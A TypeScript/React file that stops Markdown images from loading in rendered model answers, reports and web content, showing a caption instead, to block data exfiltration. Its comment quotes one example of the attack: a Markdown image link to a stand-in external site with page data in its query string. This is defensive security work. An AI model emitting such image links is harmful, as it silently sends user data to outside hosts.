import type { Components } from "react-markdown";

/**
 * 对话回答、报告、要点这些 Markdown 都来自不可信的文字（模型输出、网页、上传资料）：图片一律不发请求，只显示说明文字。
 * 否则一句 `![](https://外站/p.gif?d=…)` 不用点击就能把页面上的数据带到外站（第四轮审计）。
 * 每个 ReactMarkdown 渲染处都要带上它（自动检查见 test/markdown_images.test.ts）。
 */
export const noRemoteImages: Components = {
  img: ({ alt }) => <span className="text-muted-foreground">[图片未加载：{alt || "图片"}]</span>,
};
